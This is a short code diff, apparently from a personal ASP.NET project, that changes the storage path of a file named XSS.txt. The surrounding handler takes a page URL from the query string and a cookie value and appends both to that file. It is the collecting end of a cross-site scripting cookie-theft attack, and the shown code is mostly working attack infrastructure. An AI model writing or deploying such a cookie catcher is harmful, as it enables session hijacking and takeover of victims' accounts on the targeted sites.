@@ -26,13 +26,13 @@ namespace WebApplication5
             StringBuilder newFile = new StringBuilder();
 
             String documentURL = Request.QueryString["url"];
-            string[] file = File.ReadAllLines(@"C:\Users\Todd\Dropbox\XSS.txt");
+            string[] file = File.ReadAllLines(@"C:\Users\Todd\Desktop\XSS.txt");
             foreach (string line in file)
             {
                 newFile.Append(line + "\r\n");
             }
             newFile.Append(documentURL +": " +cookie);
-            File.WriteAllText(@"C:\Users\Todd\Dropbox\XSS.txt", newFile.ToString());
+            File.WriteAllText(@"C:\Users\Todd\Desktop\XSS.txt", newFile.ToString());
 
         }
     }
